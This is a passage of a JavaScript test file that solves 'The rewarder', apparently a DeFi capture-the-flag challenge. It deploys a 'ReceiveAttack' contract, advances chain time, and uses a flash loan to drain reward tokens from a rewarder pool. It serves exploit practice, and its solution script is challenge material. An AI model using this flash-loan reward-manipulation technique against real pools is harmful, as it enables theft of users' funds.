...
describe("[Challenge] The rewarder", function () {
  ...
  it("Execution", async function () {
    ...
    const attack = await (
      await ethers.getContractFactory("ReceiveAttack", player)
    ).deploy(liquidityToken.address, rewarderPool.address);

    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    await attack.attackRewardPool(flashLoanPool.address);

    await attack.distributeRewards();
    console.log(await rewardToken.balanceOf(attack.address));
  });
